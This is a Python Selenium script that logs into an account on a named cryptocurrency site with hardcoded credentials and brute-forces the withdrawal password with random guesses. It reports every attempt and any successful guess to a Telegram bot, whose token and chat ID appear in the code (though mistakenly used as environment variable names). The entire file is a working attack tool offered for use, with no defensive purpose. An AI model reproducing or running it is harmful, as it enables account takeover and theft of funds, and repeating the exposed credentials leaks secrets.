
import os
import time
import random
import string
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
import telebot

# Telegram setup
BOT_TOKEN = os.environ.get("7480019882:AAFpRKfsv_TZn2nKIqsFpN1VGCCtNwBjgmo")
CHAT_ID = os.environ.get("5302763233")

if not BOT_TOKEN or not CHAT_ID:
    print("BOT_TOKEN or CHAT_ID missing! Please check environment variables.")
    exit()

bot = telebot.TeleBot(BOT_TOKEN)

def send_status(msg):
    bot.send_message(CHAT_ID, msg)

def generate_password():
    length = random.randint(4, 10)
    characters = string.ascii_letters + string.digits
    return ''.join(random.sample(characters, length))

options = Options()
options.add_argument('--headless')
options.add_argument('--no-sandbox')
options.add_argument('--disable-dev-shm-usage')
driver = webdriver.Chrome(options=options)

try:
    send_status("⚙️ Bot started")
    driver.get("https://btc658.com/pages/user/other/userLogin")
    time.sleep(3)
    send_status("🔐 Logging in...")
    driver.find_element(By.ID, "account").send_keys("NOMANE")
    driver.find_element(By.ID, "password").send_keys("pd789456")
    driver.find_element(By.CLASS_NAME, "login-btn").click()
    time.sleep(5)

    driver.get("https://btc658.com/pages/user/recharge/userRecharge")
    time.sleep(3)
    send_status("➡️ Reached Recharge Wallet page")

    used = set()
    while True:
        password = generate_password()
        if password in used:
            continue
        used.add(password)
        try:
            driver.find_element(By.XPATH, '//input[@placeholder="Enter amount"]').clear()
            driver.find_element(By.XPATH, '//input[@placeholder="Enter amount"]').send_keys("100")
            pass_input = driver.find_element(By.XPATH, '//input[@type="password"]')
            pass_input.clear()
            pass_input.send_keys(password)
            driver.find_element(By.CLASS_NAME, "el-button--primary").click()
            time.sleep(2)

            send_status(f"Trying password: {password}")
            if "the withdrawal password is incorrect" not in driver.page_source.lower():
                send_status(f"✅ Correct password found: {password}")
                break
            else:
                send_status("❌ Wrong password")
        except Exception as e:
            send_status(f"⚠️ Error: {e}")
        time.sleep(5)
except Exception as e:
    send_status(f"❌ Bot crashed: {e}")
finally:
    driver.quit()
